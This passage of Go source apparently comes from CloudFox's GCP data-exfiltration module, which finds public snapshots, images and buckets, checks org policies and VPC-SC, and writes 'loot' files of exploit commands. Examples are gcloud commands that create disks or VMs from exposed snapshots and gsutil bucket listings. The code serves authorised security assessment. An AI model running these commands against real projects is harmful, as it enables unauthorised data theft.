package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	attackpathservice "github.com/BishopFox/cloudfox/gcp/services/attackpathService"
	bigqueryservice "github.com/BishopFox/cloudfox/gcp/services/bigqueryService"
	loggingservice "github.com/BishopFox/cloudfox/gcp/services/loggingService"
	orgpolicyservice "github.com/BishopFox/cloudfox/gcp/services/orgpolicyService"
	pubsubservice "github.com/BishopFox/cloudfox/gcp/services/pubsubService"
	vpcscservice "github.com/BishopFox/cloudfox/gcp/services/vpcscService"
	"github.com/BishopFox/cloudfox/gcp/shared"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"

	compute "google.golang.org/api/compute/v1"
	sqladmin "google.golang.org/api/sqladmin/v1"
	storage "google.golang.org/api/storage/v1"
	storagetransfer "google.golang.org/api/storagetransfer/v1"
)

// Module name constant
const GCP_DATAEXFILTRATION_MODULE_NAME string = "data-exfiltration"

var GCPDataExfiltrationCommand = &cobra.Command{
	Use:     GCP_DATAEXFILTRATION_MODULE_NAME,
	Aliases: []string{"exfil", "data-exfil", "exfiltration"},
	Short:   "Identify data exfiltration paths and high-risk data exposure",
	Long: `Identify data exfiltration vectors and paths in GCP environments.

This module identifies both ACTUAL misconfigurations and POTENTIAL exfiltration vectors.

Actual Findings (specific resources):
- Public snapshots and images (actual IAM policy check)
- Public buckets (actual IAM policy check)
- Cross-project logging sinks (actual sink enumeration)
- Pub/Sub push subscriptions to external endpoints
- BigQuery datasets with public IAM bindings
- Storage Transfer Service jobs to external destinations

Potential Vectors (capabilities that exist):
- BigQuery Export: Can export data to GCS bucket or external table
- Pub/Sub Subscription: Can push messages to external HTTP endpoint
- Cloud Function: Can make outbound HTTP requests to external endpoints
- Cloud Run: Can make outbound HTTP requests to external endpoints
- Logging Sink: Can export logs to external project or Pub/Sub topic

Security Controls Checked:
- VPC Service Controls (VPC-SC) perimeter protection
- Organization policies for data protection

The loot file includes commands to perform each type of exfiltration.`,
	Run: runGCPDataExfiltrationCommand,
}

// ------------------------------
// Data Structures
// ------------------------------

// ExfiltrationPath represents an actual misconfiguration or finding
type ExfiltrationPath struct {
	PathType       string   // Category of exfiltration
	ResourceName   string   // Specific resource
	ProjectID      string   // Source project
	Description    string   // What the path enables
	Destination    string   // Where data can go
	RiskLevel      string   // CRITICAL, HIGH, MEDIUM, LOW
	RiskReasons    []string // Why this is risky
	ExploitCommand string   // Command to exploit
	VPCSCProtected bool     // Is this project protected by VPC-SC?
}


type PublicExport struct {
	ResourceType string
	ResourceName string
	ProjectID    string
	AccessLevel  string // "allUsers", "allAuthenticatedUsers"
	DataType     string
	Size         string
	RiskLevel    string
}

// OrgPolicyProtection tracks which org policies protect a project from data exfiltration
type OrgPolicyProtection struct {
	ProjectID                   string
	PublicAccessPrevention      bool // storage.publicAccessPrevention enforced
	DomainRestriction           bool // iam.allowedPolicyMemberDomains enforced
	SQLPublicIPRestriction      bool // sql.restrictPublicIp enforced
	ResourceLocationRestriction bool // gcp.resourceLocations enforced
	CloudFunctionsVPCConnector  bool // cloudfunctions.requireVPCConnector enforced
	CloudRunIngressRestriction  bool // run.allowedIngress enforced
	CloudRunRequireIAMInvoker   bool // run.allowedIngress = internal or internal-and-cloud-load-balancing
	DisableBQOmniAWS            bool // bigquery.disableBQOmniAWS enforced
	DisableBQOmniAzure          bool // bigquery.disableBQOmniAzure enforced
	MissingProtections          []string
}

// PermissionBasedExfilPath is replaced by attackpathservice.AttackPath for centralized handling

// ------------------------------
// Module Struct
// ------------------------------
type DataExfiltrationModule struct {
	gcpinternal.BaseGCPModule

	ProjectExfiltrationPaths map[string][]ExfiltrationPath             // projectID -> paths
	ProjectPublicExports     map[string][]PublicExport                // projectID -> exports
	ProjectAttackPaths       map[string][]attackpathservice.AttackPath // projectID -> permission-based attack paths
	LootMap                  map[string]map[string]*internal.LootFile // projectID -> loot files
	mu                       sync.Mutex
	vpcscProtectedProj       map[string]bool                 // Projects protected by VPC-SC
	orgPolicyProtection      map[string]*OrgPolicyProtection // Org policy protections per project
	usedAttackPathCache      bool                            // Whether attack paths were loaded from cache
}

// ------------------------------
// Output Struct
// ------------------------------
type DataExfiltrationOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o DataExfiltrationOutput) TableFiles() []internal.TableFile { return o.Table }
func (o DataExfiltrationOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPDataExfiltrationCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, GCP_DATAEXFILTRATION_MODULE_NAME)
	if err != nil {
		return
	}

	module := &DataExfiltrationModule{
		BaseGCPModule:            gcpinternal.NewBaseGCPModule(cmdCtx),
		ProjectExfiltrationPaths: make(map[string][]ExfiltrationPath),
		ProjectPublicExports:     make(map[string][]PublicExport),
		ProjectAttackPaths:       make(map[string][]attackpathservice.AttackPath),
		LootMap:                  make(map[string]map[string]*internal.LootFile),
		vpcscProtectedProj:       make(map[string]bool),
		orgPolicyProtection:      make(map[string]*OrgPolicyProtection),
	}

	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *DataExfiltrationModule) getAllExfiltrationPaths() []ExfiltrationPath {
	var all []ExfiltrationPath
	for _, paths := range m.ProjectExfiltrationPaths {
		all = append(all, paths...)
	}
	return all
}


func (m *DataExfiltrationModule) getAllPublicExports() []PublicExport {
	var all []PublicExport
	for _, exports := range m.ProjectPublicExports {
		all = append(all, exports...)
	}
	return all
}

func (m *DataExfiltrationModule) getAllAttackPaths() []attackpathservice.AttackPath {
	var all []attackpathservice.AttackPath
	for _, paths := range m.ProjectAttackPaths {
		all = append(all, paths...)
	}
	return all
}

func (m *DataExfiltrationModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Identifying data exfiltration paths and potential vectors...", GCP_DATAEXFILTRATION_MODULE_NAME)

	var usedCache bool

	// Check if attack path analysis was already run (via --attack-paths flag)
	if cache := gcpinternal.GetAttackPathCacheFromContext(ctx); cache != nil && cache.HasRawData() {
		if cachedResult, ok := cache.GetRawData().(*attackpathservice.CombinedAttackPathData); ok {
			logger.InfoM("Using cached attack path analysis results for permission-based paths", GCP_DATAEXFILTRATION_MODULE_NAME)
			m.loadAttackPathsFromCache(cachedResult)
			usedCache = true
		}
	}

	// If no context cache, try loading from disk cache
	if !usedCache {
		diskCache, metadata, err := gcpinternal.LoadAttackPathCacheFromFile(m.OutputDirectory, m.Account)
		if err == nil && diskCache != nil && diskCache.HasRawData() {
			if cachedResult, ok := diskCache.GetRawData().(*attackpathservice.CombinedAttackPathData); ok {
				logger.InfoM(fmt.Sprintf("Using disk cache for permission-based paths (created: %s)",
					metadata.CreatedAt.Format("2006-01-02 15:04:05")), GCP_DATAEXFILTRATION_MODULE_NAME)
				m.loadAttackPathsFromCache(cachedResult)
				usedCache = true
			}
		}
	}

	// First, check VPC-SC protection status for all projects
	m.checkVPCSCProtection(ctx, logger)

	// Check organization policy protections for all projects
	m.checkOrgPolicyProtection(ctx, logger)

	// If we didn't use cache, analyze org and folder level exfil paths
	if !usedCache {
		m.analyzeOrgFolderExfilPaths(ctx, logger)
	}

	// Process each project - this always runs to find actual misconfigurations
	// (public buckets, snapshots, etc.) but skip permission-based analysis if cached
	m.usedAttackPathCache = usedCache
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_DATAEXFILTRATION_MODULE_NAME, m.processProject)

	// If we ran new analysis, save to cache (skip if running under all-checks)
	if !usedCache {
		m.saveToAttackPathCache(ctx, logger)
	}

	allPaths := m.getAllExfiltrationPaths()
	allPermBasedPaths := m.getAllAttackPaths()

	// Check results
	hasResults := len(allPaths) > 0 || len(allPermBasedPaths) > 0

	if !hasResults {
		logger.InfoM("No data exfiltration paths found", GCP_DATAEXFILTRATION_MODULE_NAME)
		return
	}

	if len(allPaths) > 0 {
		logger.SuccessM(fmt.Sprintf("Found %d actual misconfiguration(s)", len(allPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
	if len(allPermBasedPaths) > 0 {
		logger.SuccessM(fmt.Sprintf("Found %d permission-based exfiltration path(s)", len(allPermBasedPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
	}

	m.writeOutput(ctx, logger)
}

// loadAttackPathsFromCache loads exfil attack paths from cached data
func (m *DataExfiltrationModule) loadAttackPathsFromCache(data *attackpathservice.CombinedAttackPathData) {
	// Filter to only include exfil paths and organize by project
	for _, path := range data.AllPaths {
		if path.PathType == "exfil" {
			if path.ScopeType == "project" && path.ScopeID != "" {
				m.ProjectAttackPaths[path.ScopeID] = append(m.ProjectAttackPaths[path.ScopeID], path)
			} else if path.ScopeType == "organization" || path.ScopeType == "folder" {
				// Distribute org/folder paths to all enumerated projects
				for _, projectID := range m.ProjectIDs {
					pathCopy := path
					pathCopy.ProjectID = projectID
					m.ProjectAttackPaths[projectID] = append(m.ProjectAttackPaths[projectID], pathCopy)
				}
			}
		}
	}
}

// saveToAttackPathCache saves attack path data to disk cache
func (m *DataExfiltrationModule) saveToAttackPathCache(ctx context.Context, logger internal.Logger) {
	// Skip saving if running under all-checks (consolidated save happens at the end)
	if gcpinternal.IsAllChecksMode(ctx) {
		logger.InfoM("Skipping individual cache save (all-checks mode)", GCP_DATAEXFILTRATION_MODULE_NAME)
		return
	}

	// Run full analysis (all types) so we can cache for other modules
	svc := attackpathservice.New()
	fullResult, err := svc.CombinedAttackPathAnalysis(ctx, m.ProjectIDs, m.ProjectNames, "all")
	if err != nil {
		logger.InfoM(fmt.Sprintf("Could not run full attack path analysis for caching: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
		return
	}

	cache := gcpinternal.NewAttackPathCache()

	// Populate cache with paths from all scopes
	var pathInfos []gcpinternal.AttackPathInfo
	for _, path := range fullResult.AllPaths {
		pathInfos = append(pathInfos, gcpinternal.AttackPathInfo{
			Principal:     path.Principal,
			PrincipalType: path.PrincipalType,
			Method:        path.Method,
			PathType:      gcpinternal.AttackPathType(path.PathType),
			Category:      path.Category,
			RiskLevel:     path.RiskLevel,
			Target:        path.TargetResource,
			Permissions:   path.Permissions,
			ScopeType:     path.ScopeType,
			ScopeID:       path.ScopeID,
		})
	}
	cache.PopulateFromPaths(pathInfos)
	cache.SetRawData(fullResult)

	// Save to disk
	err = gcpinternal.SaveAttackPathCacheToFile(cache, m.ProjectIDs, m.OutputDirectory, m.Account, "1.0")
	if err != nil {
		logger.InfoM(fmt.Sprintf("Could not save attack path cache: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
	} else {
		privesc, exfil, lateral := cache.GetStats()
		logger.InfoM(fmt.Sprintf("Saved attack path cache to disk (%d privesc, %d exfil, %d lateral)",
			privesc, exfil, lateral), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
}

// analyzeOrgFolderExfilPaths analyzes organization and folder level IAM for exfil permissions
func (m *DataExfiltrationModule) analyzeOrgFolderExfilPaths(ctx context.Context, logger internal.Logger) {
	attackSvc := attackpathservice.New()

	// Analyze organization-level IAM
	orgPaths, orgNames, _, err := attackSvc.AnalyzeOrganizationAttackPaths(ctx, "exfil")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze organization-level exfil paths")
		}
	} else if len(orgPaths) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d organization-level exfil path(s)", len(orgPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
		for i := range orgPaths {
			orgName := orgNames[orgPaths[i].ScopeID]
			if orgName == "" {
				orgName = orgPaths[i].ScopeID
			}
			// Update the path with org context
			orgPaths[i].ScopeName = orgName
			orgPaths[i].RiskLevel = "CRITICAL" // Org-level is critical
			orgPaths[i].PathType = "exfil"
		}
		// Distribute org-level paths to ALL enumerated projects
		// (org-level access affects all projects in the org)
		m.mu.Lock()
		for _, projectID := range m.ProjectIDs {
			for _, path := range orgPaths {
				pathCopy := path
				pathCopy.ProjectID = projectID
				m.ProjectAttackPaths[projectID] = append(m.ProjectAttackPaths[projectID], pathCopy)
			}
		}
		m.mu.Unlock()
	}

	// Analyze folder-level IAM
	folderPaths, folderNames, err := attackSvc.AnalyzeFolderAttackPaths(ctx, "exfil")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze folder-level exfil paths")
		}
	} else if len(folderPaths) > 0 {
		logger.InfoM(fmt.Sprintf("Found %d folder-level exfil path(s)", len(folderPaths)), GCP_DATAEXFILTRATION_MODULE_NAME)
		for i := range folderPaths {
			folderName := folderNames[folderPaths[i].ScopeID]
			if folderName == "" {
				folderName = folderPaths[i].ScopeID
			}
			// Update the path with folder context
			folderPaths[i].ScopeName = folderName
			folderPaths[i].RiskLevel = "CRITICAL" // Folder-level is critical
			folderPaths[i].PathType = "exfil"
		}
		// Distribute folder-level paths to ALL enumerated projects
		// (folder-level access affects all projects in the folder)
		// TODO: Could be smarter and only distribute to projects in the folder
		m.mu.Lock()
		for _, projectID := range m.ProjectIDs {
			for _, path := range folderPaths {
				pathCopy := path
				pathCopy.ProjectID = projectID
				m.ProjectAttackPaths[projectID] = append(m.ProjectAttackPaths[projectID], pathCopy)
			}
		}
		m.mu.Unlock()
	}
}

// ------------------------------
// VPC-SC Protection Check
// ------------------------------
func (m *DataExfiltrationModule) checkVPCSCProtection(ctx context.Context, logger internal.Logger) {
	// Try to get organization ID from projects
	// VPC-SC is organization-level
	vpcsc := vpcscservice.New()

	// Get org ID from first project (simplified - in reality would need proper org detection)
	if len(m.ProjectIDs) == 0 {
		return
	}

	// Try common org IDs or skip if we don't have org access
	// This is a best-effort check
	policies, err := vpcsc.ListAccessPolicies("")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			logger.InfoM("Could not check VPC-SC policies (may require org-level access)", GCP_DATAEXFILTRATION_MODULE_NAME)
		}
		return
	}

	// For each policy, check perimeters
	for _, policy := range policies {
		perimeters, err := vpcsc.ListServicePerimeters(policy.Name)
		if err != nil {
			continue
		}

		// Mark projects in perimeters as protected
		for _, perimeter := range perimeters {
			for _, resource := range perimeter.Resources {
				// Resources are in format "projects/123456"
				projectNum := strings.TrimPrefix(resource, "projects/")
				m.mu.Lock()
				m.vpcscProtectedProj[projectNum] = true
				m.mu.Unlock()
			}
		}
	}
}

// ------------------------------
// Organization Policy Protection Check
// ------------------------------
func (m *DataExfiltrationModule) checkOrgPolicyProtection(ctx context.Context, logger internal.Logger) {
	orgSvc := orgpolicyservice.New()

	for _, projectID := range m.ProjectIDs {
		protection := &OrgPolicyProtection{
			ProjectID:          projectID,
			MissingProtections: []string{},
		}

		// Get all policies for this project
		policies, err := orgSvc.ListProjectPolicies(projectID)
		if err != nil {
			// Non-fatal - continue with other projects
			if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Could not check org policies for %s: %v", projectID, err), GCP_DATAEXFILTRATION_MODULE_NAME)
			}
			m.mu.Lock()
			m.orgPolicyProtection[projectID] = protection
			m.mu.Unlock()
			continue
		}

		// Check for specific protective policies
		for _, policy := range policies {
			switch policy.Constraint {
			case "constraints/storage.publicAccessPrevention":
				if policy.Enforced {
					protection.PublicAccessPrevention = true
				}
			case "constraints/iam.allowedPolicyMemberDomains":
				if policy.Enforced || len(policy.AllowedValues) > 0 {
					protection.DomainRestriction = true
				}
			case "constraints/sql.restrictPublicIp":
				if policy.Enforced {
					protection.SQLPublicIPRestriction = true
				}
			case "constraints/gcp.resourceLocations":
				if policy.Enforced || len(policy.AllowedValues) > 0 {
					protection.ResourceLocationRestriction = true
				}
			case "constraints/cloudfunctions.requireVPCConnector":
				if policy.Enforced {
					protection.CloudFunctionsVPCConnector = true
				}
			case "constraints/run.allowedIngress":
				// Check if ingress is restricted to internal or internal-and-cloud-load-balancing
				if len(policy.AllowedValues) > 0 {
					for _, val := range policy.AllowedValues {
						if val == "internal" || val == "internal-and-cloud-load-balancing" {
							protection.CloudRunIngressRestriction = true
							break
						}
					}
				}
			case "constraints/bigquery.disableBQOmniAWS":
				if policy.Enforced {
					protection.DisableBQOmniAWS = true
				}
			case "constraints/bigquery.disableBQOmniAzure":
				if policy.Enforced {
					protection.DisableBQOmniAzure = true
				}
			}
		}

		// Identify missing protections
		if !protection.PublicAccessPrevention {
			protection.MissingProtections = append(protection.MissingProtections, "storage.publicAccessPrevention not enforced")
		}
		if !protection.DomainRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "iam.allowedPolicyMemberDomains not configured")
		}
		if !protection.SQLPublicIPRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "sql.restrictPublicIp not enforced")
		}
		if !protection.CloudFunctionsVPCConnector {
			protection.MissingProtections = append(protection.MissingProtections, "cloudfunctions.requireVPCConnector not enforced")
		}
		if !protection.CloudRunIngressRestriction {
			protection.MissingProtections = append(protection.MissingProtections, "run.allowedIngress not restricted")
		}
		if !protection.DisableBQOmniAWS {
			protection.MissingProtections = append(protection.MissingProtections, "bigquery.disableBQOmniAWS not enforced")
		}
		if !protection.DisableBQOmniAzure {
			protection.MissingProtections = append(protection.MissingProtections, "bigquery.disableBQOmniAzure not enforced")
		}

		m.mu.Lock()
		m.orgPolicyProtection[projectID] = protection
		m.mu.Unlock()
	}
}

// isOrgPolicyProtected checks if a project has key org policy protections
func (m *DataExfiltrationModule) isOrgPolicyProtected(projectID string) bool {
	if protection, ok := m.orgPolicyProtection[projectID]; ok {
		// Consider protected if at least public access prevention is enabled
		return protection.PublicAccessPrevention
	}
	return false
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *DataExfiltrationModule) initializeLootForProject(projectID string) {
	if m.LootMap[projectID] == nil {
		m.LootMap[projectID] = make(map[string]*internal.LootFile)
		m.LootMap[projectID]["data-exfiltration-commands"] = &internal.LootFile{
			Name:     "data-exfiltration-commands",
			Contents: "# Data Exfiltration Commands\n# Generated by CloudFox\n# WARNING: Only use with proper authorization!\n\n",
		}
	}
}

func (m *DataExfiltrationModule) generatePlaybook() *internal.LootFile {
	// Convert all findings to AttackPath format for centralized playbook generation
	allAttackPaths := m.collectAllAttackPaths()

	return &internal.LootFile{
		Name:     "data-exfiltration-playbook",
		Contents: attackpathservice.GenerateExfilPlaybook(allAttackPaths, ""),
	}
}

// collectAllAttackPaths converts ExfiltrationPath and PublicExport to AttackPath
func (m *DataExfiltrationModule) collectAllAttackPaths() []attackpathservice.AttackPath {
	var allPaths []attackpathservice.AttackPath

	// Convert ExfiltrationPaths (actual misconfigurations)
	for _, paths := range m.ProjectExfiltrationPaths {
		for _, p := range paths {
			allPaths = append(allPaths, m.exfiltrationPathToAttackPath(p))
		}
	}

	// Convert PublicExports (bucket specific public exports)
	for _, exports := range m.ProjectPublicExports {
		for _, e := range exports {
			allPaths = append(allPaths, m.publicExportToAttackPath(e))
		}
	}

	// Include permission-based attack paths (already in AttackPath format)
	for _, paths := range m.ProjectAttackPaths {
		allPaths = append(allPaths, paths...)
	}

	return allPaths
}

// exfiltrationPathToAttackPath converts ExfiltrationPath to AttackPath with correct category mapping
func (m *DataExfiltrationModule) exfiltrationPathToAttackPath(p ExfiltrationPath) attackpathservice.AttackPath {
	// Map PathType to centralized category
	category := mapExfilPathTypeToCategory(p.PathType)

	return attackpathservice.AttackPath{
		PathType:       "exfil",
		Category:       category,
		Method:         p.PathType,
		Principal:      "N/A (Misconfiguration)",
		PrincipalType:  "resource",
		TargetResource: p.ResourceName,
		ProjectID:      p.ProjectID,
		ScopeType:      "project",
		ScopeID:        p.ProjectID,
		ScopeName:      p.ProjectID,
		Description:    p.Destination,
		Permissions:    []string{},
		ExploitCommand: p.ExploitCommand,
	}
}


// publicExportToAttackPath converts PublicExport to AttackPath
func (m *DataExfiltrationModule) publicExportToAttackPath(e PublicExport) attackpathservice.AttackPath {
	category := "Public Bucket"
	if e.ResourceType == "snapshot" {
		category = "Public Snapshot"
	} else if e.ResourceType == "image" {
		category = "Public Image"
	} else if e.ResourceType == "dataset" {
		category = "Public BigQuery"
	}

	return attackpathservice.AttackPath{
		PathType:       "exfil",
		Category:       category,
		Method:         e.ResourceType + " (" + e.AccessLevel + ")",
		Principal:      e.AccessLevel,
		PrincipalType:  "public",
		TargetResource: e.ResourceName,
		ProjectID:      e.ProjectID,
		ScopeType:      "project",
		ScopeID:        e.ProjectID,
		ScopeName:      e.ProjectID,
		Description:    fmt.Sprintf("Public %s with %s access", e.ResourceType, e.AccessLevel),
		Permissions:    []string{},
		ExploitCommand: "",
	}
}

// mapExfilPathTypeToCategory maps ExfiltrationPath.PathType to centralized categories
func mapExfilPathTypeToCategory(pathType string) string {
	switch {
	case strings.Contains(pathType, "Snapshot"):
		return "Public Snapshot"
	case strings.Contains(pathType, "Image"):
		return "Public Image"
	case strings.Contains(pathType, "Bucket"), strings.Contains(pathType, "Storage"):
		return "Public Bucket"
	case strings.Contains(pathType, "Logging"):
		return "Logging Sink"
	case strings.Contains(pathType, "Pub/Sub Push") || strings.Contains(pathType, "PubSub Push"):
		return "Pub/Sub Push"
	case strings.Contains(pathType, "Pub/Sub BigQuery") || strings.Contains(pathType, "PubSub BigQuery"):
		return "Pub/Sub BigQuery Export"
	case strings.Contains(pathType, "Pub/Sub GCS") || strings.Contains(pathType, "PubSub GCS"):
		return "Pub/Sub GCS Export"
	case strings.Contains(pathType, "Pub/Sub") || strings.Contains(pathType, "PubSub"):
		return "Pub/Sub Push" // Default Pub/Sub category
	case strings.Contains(pathType, "BigQuery"):
		return "Public BigQuery"
	case strings.Contains(pathType, "SQL"):
		return "Cloud SQL Export"
	case strings.Contains(pathType, "Transfer"):
		return "Storage Transfer Job"
	default:
		return "Potential Vector"
	}
}

func (m *DataExfiltrationModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Analyzing exfiltration paths in project: %s", projectID), GCP_DATAEXFILTRATION_MODULE_NAME)
	}

	m.mu.Lock()
	m.initializeLootForProject(projectID)
	m.mu.Unlock()

	// === ACTUAL MISCONFIGURATIONS ===

	// 1. Find public/shared snapshots (REAL check)
	m.findPublicSnapshots(ctx, projectID, logger)

	// 2. Find public/shared images (REAL check)
	m.findPublicImages(ctx, projectID, logger)

	// 3. Find public buckets (REAL check)
	m.findPublicBuckets(ctx, projectID, logger)

	// 4. Find cross-project logging sinks (REAL enumeration)
	m.findCrossProjectLoggingSinks(ctx, projectID, logger)

	// 5. Find Pub/Sub push subscriptions to external endpoints (REAL check)
	m.findPubSubPushEndpoints(ctx, projectID, logger)

	// 6. Find Pub/Sub subscriptions exporting to external destinations
	m.findPubSubExportSubscriptions(ctx, projectID, logger)

	// 7. Find BigQuery datasets with public access (REAL check)
	m.findPublicBigQueryDatasets(ctx, projectID, logger)

	// 8. Find Cloud SQL with export enabled
	m.findCloudSQLExportConfig(ctx, projectID, logger)

	// 9. Find Storage Transfer jobs to external destinations
	m.findStorageTransferJobs(ctx, projectID, logger)

	// === PERMISSION-BASED EXFILTRATION CAPABILITIES ===

	// 10. Check IAM for principals with data exfiltration permissions
	m.findPermissionBasedExfilPaths(ctx, projectID, logger)
}

// findPublicSnapshots finds snapshots that are publicly accessible
func (m *DataExfiltrationModule) findPublicSnapshots(ctx context.Context, projectID string, logger internal.Logger) {
	computeService, err := compute.NewService(ctx)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not create Compute service in project %s", projectID))
		return
	}

	req := computeService.Snapshots.List(projectID)
	err = req.Pages(ctx, func(page *compute.SnapshotList) error {
		for _, snapshot := range page.Items {
			// Get IAM policy for snapshot
			policy, err := computeService.Snapshots.GetIamPolicy(projectID, snapshot.Name).Do()
			if err != nil {
				continue
			}

			// Check for public access
			accessLevel := ""
			for _, binding := range policy.Bindings {
				for _, member := range binding.Members {
					if shared.IsPublicPrincipal(member) {
						if member == "allUsers" {
							accessLevel = "allUsers"
							break
						}
						if accessLevel != "allUsers" {
							accessLevel = "allAuthenticatedUsers"
						}
					}
				}
			}

			if accessLevel != "" {
				export := PublicExport{
					ResourceType: "Disk Snapshot",
					ResourceName: snapshot.Name,
					ProjectID:    projectID,
					AccessLevel:  accessLevel,
					DataType:     "disk_snapshot",
					Size:         fmt.Sprintf("%d GB", snapshot.DiskSizeGb),
					RiskLevel:    "CRITICAL",
				}

				path := ExfiltrationPath{
					PathType:     "Public Snapshot",
					ResourceName: snapshot.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("Disk snapshot (%d GB) accessible to %s", snapshot.DiskSizeGb, accessLevel),
					Destination:  "Anyone with access level: " + accessLevel,
					RiskLevel:    "CRITICAL",
					RiskReasons:  []string{"Snapshot is publicly accessible", "May contain sensitive data from disk"},
					ExploitCommand: fmt.Sprintf(
						"# Create disk from public snapshot\n"+
							"gcloud compute disks create exfil-disk --source-snapshot=projects/%s/global/snapshots/%s --zone=us-central1-a",
						projectID, snapshot.Name),
				}

				m.mu.Lock()
				m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list snapshots in project %s", projectID))
	}
}

// findPublicImages finds images that are publicly accessible
func (m *DataExfiltrationModule) findPublicImages(ctx context.Context, projectID string, logger internal.Logger) {
	computeService, err := compute.NewService(ctx)
	if err != nil {
		return
	}

	req := computeService.Images.List(projectID)
	err = req.Pages(ctx, func(page *compute.ImageList) error {
		for _, image := range page.Items {
			// Get IAM policy for image
			policy, err := computeService.Images.GetIamPolicy(projectID, image.Name).Do()
			if err != nil {
				continue
			}

			// Check for public access
			accessLevel := ""
			for _, binding := range policy.Bindings {
				for _, member := range binding.Members {
					if shared.IsPublicPrincipal(member) {
						if member == "allUsers" {
							accessLevel = "allUsers"
							break
						}
						if accessLevel != "allUsers" {
							accessLevel = "allAuthenticatedUsers"
						}
					}
				}
			}

			if accessLevel != "" {
				export := PublicExport{
					ResourceType: "VM Image",
					ResourceName: image.Name,
					ProjectID:    projectID,
					AccessLevel:  accessLevel,
					DataType:     "vm_image",
					Size:         fmt.Sprintf("%d GB", image.DiskSizeGb),
					RiskLevel:    "CRITICAL",
				}

				path := ExfiltrationPath{
					PathType:     "Public Image",
					ResourceName: image.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("VM image (%d GB) accessible to %s", image.DiskSizeGb, accessLevel),
					Destination:  "Anyone with access level: " + accessLevel,
					RiskLevel:    "CRITICAL",
					RiskReasons:  []string{"VM image is publicly accessible", "May contain embedded credentials or sensitive data"},
					ExploitCommand: fmt.Sprintf(
						"# Create instance from public image\n"+
							"gcloud compute instances create exfil-vm --image=projects/%s/global/images/%s --zone=us-central1-a",
						projectID, image.Name),
				}

				m.mu.Lock()
				m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list images in project %s", projectID))
	}
}

// findPublicBuckets finds GCS buckets with public access
func (m *DataExfiltrationModule) findPublicBuckets(ctx context.Context, projectID string, logger internal.Logger) {
	storageService, err := storage.NewService(ctx)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not create Storage service in project %s", projectID))
		return
	}

	resp, err := storageService.Buckets.List(projectID).Do()
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list buckets in project %s", projectID))
		return
	}

	for _, bucket := range resp.Items {
		// Get IAM policy for bucket
		policy, err := storageService.Buckets.GetIamPolicy(bucket.Name).Do()
		if err != nil {
			continue
		}

		// Check for public access
		accessLevel := ""
		for _, binding := range policy.Bindings {
			for _, member := range binding.Members {
				if shared.IsPublicPrincipal(member) {
					if member == "allUsers" {
						accessLevel = "allUsers"
						break
					}
					if accessLevel != "allUsers" {
						accessLevel = "allAuthenticatedUsers"
					}
				}
			}
		}

		if accessLevel != "" {
			export := PublicExport{
				ResourceType: "Storage Bucket",
				ResourceName: bucket.Name,
				ProjectID:    projectID,
				AccessLevel:  accessLevel,
				DataType:     "gcs_bucket",
				RiskLevel:    "CRITICAL",
			}

			path := ExfiltrationPath{
				PathType:     "Public Bucket",
				ResourceName: bucket.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("GCS bucket accessible to %s", accessLevel),
				Destination:  "Anyone with access level: " + accessLevel,
				RiskLevel:    "CRITICAL",
				RiskReasons:  []string{"Bucket is publicly accessible", "May contain sensitive files"},
				ExploitCommand: fmt.Sprintf(
					"# List public bucket contents\n"+
						"gsutil ls -r gs://%s/\n"+
